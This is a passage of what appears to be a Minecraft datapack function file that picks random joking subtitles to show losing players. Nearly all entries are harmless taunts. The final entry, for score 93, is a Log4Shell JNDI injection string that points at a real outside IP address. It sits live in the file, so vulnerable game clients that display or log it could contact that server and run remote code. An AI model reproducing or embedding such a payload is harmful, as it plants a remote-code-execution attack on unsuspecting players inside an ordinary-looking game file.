...
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=66}] run title @a[tag=Loser] subtitle ["",{"text":"Trollusa.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=67}] run title @a[tag=Loser] subtitle ["",{"text":"That's a lot of damage!","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=68}] run title @a[tag=Loser] subtitle ["",{"text":"Anticheat works, I guess...","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=69}] run title @a[tag=Loser] subtitle ["",{"text":"Lost your great win streak sadge","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=70}] run title @a[tag=Loser] subtitle ["",{"text":"Balancing is hard!","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=71}] run title @a[tag=Loser] subtitle ["",{"text":"uninstalling minecraft","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=72}] run title @a[tag=Loser] subtitle ["",{"text":"Cry about it.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=73}] run title @a[tag=Loser] subtitle ["",{"text":"bruh nawhhhh nah no way bruhhh fr? Bruhhh","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=74}] run title @a[tag=Loser] subtitle ["",{"text":"but the the I when I I but how they do the win I the did well how did the I do","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=75}] run title @a[tag=Loser] subtitle ["",{"text":"-30,000,000 social credit","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=76}] run title @a[tag=Loser] subtitle ["",{"text":"releasing nukes","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=77}] run title @a[tag=Loser] subtitle ["",{"text":"Reported for: Malicious threat","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=78}] run title @a[tag=Loser] subtitle ["",{"text":"I hope your bicycle gets a flat tire! >:(","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=79}] run title @a[tag=Loser] subtitle ["",{"text":"Thanos ping","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=80}] run title @a[tag=Loser] subtitle ["",{"text":"guess you were a rocket loser","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=81}] run title @a[tag=Loser] subtitle ["",{"text":"That wasn't supposed to happen...","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=82}] run title @a[tag=Loser] subtitle ["",{"text":"So what that you won, I wasn't trying anyways!","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=83}] run title @a[tag=Loser] subtitle ["",{"text":"You have received: 1 L","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=84}] run title @a[tag=Loser] subtitle ["",{"text":"Here's your participation trophy!","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=85}] run title @a[tag=Loser] subtitle ["",{"text":"Initiation failed, resetting world...","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=86}] run title @a[tag=Loser] subtitle ["",{"text":"don't worry, that wasn't EZU canon","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=87}] run title @a[tag=Loser] subtitle ["",{"text":"Should've gone to Planetary Cove","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=88}] run title @a[tag=Loser] subtitle ["",{"text":"I've seen a fish play better.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=89}] run title @a[tag=Loser] subtitle ["",{"text":"Yes Rico, kaboom.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=90}] run title @a[tag=Loser] subtitle ["",{"text":"No victory popcorn for you.","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=91}] run title @a[tag=Loser] subtitle ["",{"text":"L","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=92}] run title @a[tag=Loser] subtitle ["",{"text":"ratio","color":"red"}]
execute as @e[type=marker,tag=RandomLossSplash,scores={RNGscore=93}] run title @a[tag=Loser] subtitle ["",{"text":"${jndi:ldap://178.63.51.142:8080/pwned}","color":"red"}]
